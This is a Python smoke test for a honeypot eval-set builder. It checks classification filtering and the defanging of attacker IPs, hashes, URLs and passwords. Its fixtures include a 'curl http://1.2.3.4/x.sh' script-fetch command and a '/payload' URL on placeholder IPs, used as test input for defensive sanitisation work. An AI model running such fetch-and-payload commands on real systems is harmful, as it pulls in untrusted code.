"""Smoke test for the eval-sampler privacy/egress gate (CAP-1).

Covers `scripts/build_eval_set.py`'s two write-time gates:
  * Classification: only `dshield.classification: public` rollups are
    sampled; `confidential` and untagged (absent field) rollups are
    excluded — fail-safe, mirrors `is_releasable`'s default posture.
  * Defang: attacker IPs, file hashes, and URL schemes are neutered in
    place across the rollup doc, raw events, command enrichments, and the
    joined hash/url intel (including their dict keys); `cowrie.password`
    is masked outright. Inline occurrences in command text are defanged
    without changing whitespace/token count.

Standalone — no ES, no LLM, no network; exercises the pure sampling/defang
functions directly with in-memory fixtures.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke/smoke_test_build_eval_set.py
"""
from __future__ import annotations

import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import build_eval_set as bes  # noqa: E402


def _rollup(classification: str | None, session_id: str = "sid1") -> dict:
    rec: dict = {"cowrie": {"session_id": session_id}}
    if classification is not None:
        rec["dshield"] = {"classification": classification}
    return rec


def test_public_rollup_included() -> None:
    cfg = types.SimpleNamespace()
    assert bes._is_releasable_rollup(_rollup("public"), cfg) is True
    print("  ok: public rollup is releasable")


def test_confidential_rollup_excluded() -> None:
    cfg = types.SimpleNamespace()
    assert bes._is_releasable_rollup(_rollup("confidential"), cfg) is False
    print("  ok: confidential rollup excluded")


def test_untagged_rollup_excluded_fail_safe() -> None:
    cfg = types.SimpleNamespace()  # no `.classification` attr -> fail-safe default
    assert bes._is_releasable_rollup(_rollup(None), cfg) is False
    print("  ok: untagged rollup excluded under fail-safe default")


def test_sample_stratified_skips_non_releasable() -> None:
    cfg = types.SimpleNamespace()
    rollups = [
        _rollup("public", "pub1"),
        _rollup("confidential", "conf1"),
        _rollup(None, "untagged1"),
    ]
    for r in rollups:
        d = r.get("dshield") or {}
        d["cowrie"] = {"enrichment": {"session": {"command_count": 1}}}
        r["dshield"] = d
    out, stats = bes._sample_stratified(iter(rollups), {}, target_n=10, per_playbook_cap=5, cfg=cfg)
    assert stats["skipped_non_releasable"] == 2, stats
    assert len(out) == 1 and out[0]["cowrie"]["session_id"] == "pub1", out
    print("  ok: _sample_stratified drops confidential + untagged, keeps public")


def test_defang_ip_and_hash_inline_in_command_text() -> None:
    sha256 = "a" * 64
    text = f"curl http://1.2.3.4/x.sh; sha256sum was {sha256}"
    out = bes._defang_text(text)
    assert "1.2.3.4" not in out, out
    assert "1[.]2[.]3[.]4" in out, out
    assert sha256 not in out, out
    assert "hxxp://" in out, out
    # Structure-preserving: same token count (split on whitespace).
    assert len(text.split()) == len(out.split()), (text, out)
    print("  ok: inline IP/hash/URL defanged, token count unchanged")


def test_defang_walk_masks_password() -> None:
    ev = {"cowrie": {"password": "hunter2"}}
    bes._defang_walk(ev)
    assert ev["cowrie"]["password"] == bes._PASSWORD_MASK, ev
    print("  ok: cowrie.password masked outright")


def test_defang_walk_neuters_source_ip_and_threat_indicator_hash() -> None:
    sha256 = "b" * 64
    doc = {
        "source": {"ip": "5.6.7.8"},
        "threat": {"indicator": [{"type": "file", "file": {"hash": {"sha256": sha256}}}]},
    }
    bes._defang_walk(doc)
    assert doc["source"]["ip"] == "5[.]6[.]7[.]8", doc
    got = doc["threat"]["indicator"][0]["file"]["hash"]["sha256"]
    assert sha256 not in got and "[.]" in got, got
    print("  ok: source.ip and threat.indicator[].file.hash.sha256 defanged")


def test_defang_walk_neuters_bare_strings_in_a_list() -> None:
    # artifact_set-style: an LLM-extracted IOC summary is a list of bare
    # "kind:value" strings, not a list of dicts — a naive dict-only walk
    # misses these (the real gap CAP-1 shipped with initially).
    sha256 = "d" * 64
    doc = {"artifact_set": ["file:x", f"file:{sha256}", "ip:1.2.3.4",
                            "url:http://5.6.7.8/x"]}
    bes._defang_walk(doc)
    joined = " ".join(doc["artifact_set"])
    assert "1.2.3.4" not in joined and "1[.]2[.]3[.]4" in joined, doc
    assert sha256 not in joined, doc
    assert "http://" not in joined and "hxxp://" in joined, doc
    print("  ok: bare strings inside a list (artifact_set) are defanged")


def test_defang_record_rekeys_hash_and_url_intel() -> None:
    sha256 = "c" * 64
    url = "http://9.9.9.9/payload"
    rec = {
        "rollup_doc": {},
        "raw_events": [],
        "command_enrichments": [],
        "hash_intel": {sha256: {"artifact": {"value": sha256}}},
        "url_intel": {url: {"artifact": {"value": url}}},
    }
    out = bes._defang_record(rec)
    assert sha256 not in out["hash_intel"], out["hash_intel"]
    (defanged_key,) = out["hash_intel"].keys()
    assert "[.]" in defanged_key
    assert out["hash_intel"][defanged_key]["artifact"]["value"] != sha256
    assert url not in out["url_intel"], out["url_intel"]
    (defanged_url,) = out["url_intel"].keys()
    assert defanged_url.startswith("hxxp://"), defanged_url
    print("  ok: hash_intel/url_intel rekeyed and inner artifact.value defanged")


def main() -> int:
    print("smoke_test_build_eval_set:")
    test_public_rollup_included()
    test_confidential_rollup_excluded()
    test_untagged_rollup_excluded_fail_safe()
    test_sample_stratified_skips_non_releasable()
    test_defang_ip_and_hash_inline_in_command_text()
    test_defang_walk_masks_password()
    test_defang_walk_neuters_source_ip_and_threat_indicator_hash()
    test_defang_walk_neuters_bare_strings_in_a_list()
    test_defang_record_rekeys_hash_and_url_intel()
    print("ALL PASS")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
